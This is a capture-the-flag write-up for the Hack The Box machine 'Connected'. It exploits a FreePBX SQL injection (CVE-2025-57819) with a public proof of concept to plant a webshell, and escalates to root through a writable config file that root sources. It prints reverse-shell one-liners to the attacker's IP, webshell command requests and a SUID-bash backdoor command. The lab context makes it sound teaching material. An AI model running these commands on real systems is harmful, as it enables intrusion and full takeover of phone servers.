***Connected — HTB Writeup***


Machine: Connected (Hack The Box, Seasonal Lab) Difficulty: Easy OS: Linux Target: FreePBX / Asterisk PBX

![connect](/writeups/images/connected1.png)

So I finally sat down to knock out Connected, an Easy-rated Linux box on HTB’s seasonal lab. FreePBX box, looked pretty standard on paper. It mostly was — right up until the privesc, where I spent way longer than I’d like to admit chasing a “bypass” that turned out to be a real, working security control. More on that below, because I think it’s actually the more useful part of this write-up.


### Recon
Standard full port scan to start:
```bash
sudo nmap -p- --min-rate 5000 -Pn 10.10.xx.xx -oN connect.txt
```

Three ports back:
```bash
22/tcp — OpenSSH 7.4
80/tcp — Apache 2.4.6 (CentOS), PHP 7.4.16
443/tcp — same stack
```

80 redirects to /admin, which redirects again to config.php. Nothing loaded for a bit — more on that in a second, it wasn't the app's fault.

Checked the TLS cert on 443 out of habit:
```bash
commonName = pbxconnect
```

Combined with the /admin path, that's a pretty strong tell this is FreePBX. Confirmed the version poking around the login page:
```bash
FreePBX 16.0.40.7
```

That version number is basically the whole game. FreePBX 16.0.40.7 has a critical unauthenticated SQLi (CVE-2025–57819), and once I saw that version string I already knew roughly where this was going.

***Wait, why is nothing loading***
Before I even got to exploiting anything, config.php just... timed out. Every time. Not a "slow page," a full hang. Wasted more time than I want to admit assuming it was a WAF or rate limiting.

It wasn’t. It was my own tunnel.

```bash
ip link show tun0
```

MTU was sitting at the default 1500, and something about the path to this particular lab network doesn’t like that — packets were getting fragmented and just dying. Dropped it down:

```bash
sudo ip link set dev tun0 mtu 1200
```

And suddenly everything just… worked. If you’re doing this box and your HTTP requests are silently dying for no reason, check this before you assume the app is broken. It’ll cost you thirty minutes of confused re-scanning otherwise.

***Getting in — CVE-2025–57819***
Okay, so the actual vuln. This isn’t just “there’s a SQLi somewhere” — the interesting bit is what the injection is used for.

FreePBX 16.0.40.7’s /admin/ajax.php has an unauthenticated SQL injection. Instead of using it to dump data, the exploit uses it to write directly into FreePBX's own cron job table in the database. FreePBX has an internal scheduler that periodically reads that table and turns rows into real, executed cron jobs. So the SQLi isn't the RCE by itself — it's a way to plant a job that becomes RCE once FreePBX's own scheduler picks it up and runs it, roughly two minutes later. That job drops a PHP webshell straight into the web root. No auth needed anywhere in this chain.

Used the watchTowr PoC for this rather than hand-rolling it:

```bash
git clone https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819.git
cd watchTowr-vs-FreePBX-CVE-2025-57819
python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://10.10.xx.xx/
```

Then just… waited. About two minutes, like the writeups say. Then checked:
```bash
curl -s "http://10.10.xx.xx/[webshell-path].php?cmd=id"
# uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

There it is. Upgraded to something I could actually work in:

```bash
# listener
nc -lvnp 4444
```

```bash
# via the webshell
curl -s "http://10.10.xx.xx/[webshell-path].php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.xx.xx/4444%200%3E%261%27"
```

Shell as asterisk. Standard low-priv FreePBX service account.


Privesc — where it got annoying
This is the part I actually want to talk through in detail, because I went down a wrong path first and I think why it was wrong is more instructive than just handing you the working command.

The usual checks, all dead ends

```bash
sudo -l                                          # needs a password, nope
find / -perm -4000 -type f 2>/dev/null           # nothing juicy
find / -writable -type f -user root 2>/dev/null  # nothing directly useful
```

Fine. Onto less obvious stuff. Checked incron, since it’s one of those things people forget to audit as carefully as cron:

```bash
cat /etc/incron.d/*
```

Bunch of entries, all triggered by writes to files in /var/spool/asterisk/sysadmin/ or similar, all running as root. Two stood out:

/var/

```bash
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart

```

***Attempt 1:*** sysadmin_manager — ***this is the one that burned my time***
sysadmin_manager runs as root and executes "hook" scripts under FreePBX module folders, but only if a module.sig file next to them checks out. Found a writable hook almost immediately:

```bash
ls -la /var/www/html/admin/modules/ucp/hooks/
# -rwxrwxr-x 1 asterisk asterisk  logrotate
```

Great — writable by asterisk. Obvious move: backdoor it, then patch the signature file to match.

```bash
cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.xx.xx/4445 0>&1
EOF
```
```bash
NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')
sed -i "s/hooks\/logrotate = .*/hooks\/logrotate = $NEW_HASH/" \
    /var/www/html/admin/modules/ucp/module.sig
touch /var/spool/asterisk/incron/ucp.logrotate
```


I want to be honest: this doesn’t actually work, and I spent way too long assuming I just wasn’t triggering it right. Listener up, hash matching perfectly, incron confirmed running as root — nothing. No callback, ever.


Turns out module.sig isn't a plain hash manifest. It's a full PGP clearsigned message

```bash
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
...
hooks/logrotate = 13cf7bd4...
```
Clearsigning cryptographically binds the whole block to a signature at the bottom. Editing the hash line with sed doesn't fool anything — it just makes the signature invalid, because the signed content no longer matches what was actually signed. Confirmed this by pulling logic straight out of the binary:

```bash

strings /usr/bin/sysadmin_manager | grep -i -A3 -B3 "checkSig"
```
```bash
$verify = $g->checkSig($sigfile);
if (!isset($verify['hashes'])) { exit; }
if (!isset($verify['config']['signedwith'])) { exit; }
$signedwith = $verify['config']['signedwith'];
if (!isset($whitelist[$signedwith])) { exit; }
```

That’s a real GPG verify, gated on a hardcoded key whitelist. Checked if asterisk had a usable private key just to be thorough:

```bash
find / -iname "*secring*" 2>/dev/null
ls -la /home/asterisk/.gnupg/secring.gpg
# -rw-rw-r-- 1 asterisk asterisk 0 ...
```

Zero bytes. Empty. No key. This is a properly implemented control and I was never going to bypass it this way. Lesson: don’t assume every “signature check” in a CTF box is theater — sometimes it’s just doing its job, and you need to go find the thing next to it that isn’t.


***Attempt 2:*** sysadmin_dahdi_restart — ***this is the one that actually works***
Different incron entry, no signature check anywhere near it:

```bash
strings /usr/sbin/sysadmin_dahdi_restart
#!/bin/sh
/etc/init.d/asterisk stop
sleep 5
/etc/init.d/dahdi restart
sleep 5
...
```

And /etc/init.d/dahdi does this near the top:

```bash
grep -n "init.conf" /etc/init.d/dahdi
# [ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
```

That’s a dot-source, not a subprocess call. It runs the file’s contents inline, in that same root shell, as if you’d typed it in yourself. And:

```bash
ls -l /etc/dahdi/init.conf
# -rw-r--r-- 1 asterisk asterisk 863 ...

```


Writable by asterisk. No signature, no hash, nothing. This is the actual hole — a config file getting sourced by root with zero validation on who can write to it.

```bash
printf '\n install -m 4755 /bin/bash /home/asterisk/pwn1 \n' >> /etc/dahdi/init.conf
touch /var/spool/asterisk/sysadmin/dahdi_restart

```

Wait for it (there’s two sleep 5s in the trigger script plus service restart overhead, so give it a solid 20-25 seconds), then:


```bash

ls -la /home/asterisk/pwn1
# -rwsr-xr-x 1 root root 964536 ...

```

SUID root bash sitting right there.

```bash
/home/asterisk/pwn1 -p
id
# uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
```

***Root.***

Three dumb things that made it look broken when it wasn’t
Not gonna pretend this worked first try even once I had the right idea. Three separate things stacked on top of each other and each one made it look completely dead:

1. /tmp lied to me. First attempt wrote the SUID binary to /tmp/pwn1. ps aux confirmed the whole chain really was running as root, every trigger, no doubt about it — and yet /tmp/pwn1 never showed up. Turns out dahdi.service is a systemd unit with PrivateTmp=true, so it gets its own private /tmp I literally cannot see from my shell. Root did exactly what I told it to; I just couldn't see where. Moved the output to /home/asterisk/ instead and it appeared instantly.

2. Leftover garbage from an earlier attempt blocked everything after it. I’d tried a raw reverse shell one-liner in this same file earlier and forgot to clean it up:



```bash
bash -i >& /dev/tcp/10.10.xx.xx/4545 0>&1
```
Since the file gets sourced, not run as a script, every line executes in sequence in that same shell. With no listener up, that line just hangs forever trying to connect — and everything after it, including my actual payload, never gets reached. Silent, no error, nothing. Had to cat -A the file to actually see what was sitting in there and strip it out.

3. I kept checking way too fast. Two sleep 5s plus stopping/restarting a whole service is not instant. Checked for the output file immediately after triggering more than once and just... hadn't waited long enough. sleep 25 before checking fixed this on the very next attempt, once the other two issues were also fixed.

***Flags***
```bash
cat /home/asterisk/user.txt
# ada84****************************
```
```bash
cat /root/root.txt
# dbf49****************************
```

***Takeaways***
FreePBX 16.0.40.7 is trivially owned if it’s exposed — the SQLi-to-cron-to-webshell chain requires no auth and no user interaction whatsoever.
If your requests are silently timing out on a VPN’d HTB box and nothing else explains it, check your tunnel MTU before you assume the app is broken.
Don’t assume every signature/integrity check on a box is fake. Sometimes one is real, and the actual bug is sitting in a completely different, unvalidated code path right next to it — going looking for that is more productive than trying to force the hardened one.
Sourcing a config file as root that a lower-privileged user can write to is just arbitrary code execution with extra steps, no matter how boring the file looks.
When something silently “doesn’t work,” don’t just retry the same command — isolate each variable. ps aux to confirm it's actually running as root, cat -A to see what's really in the file, and just... wait longer than you think you need to.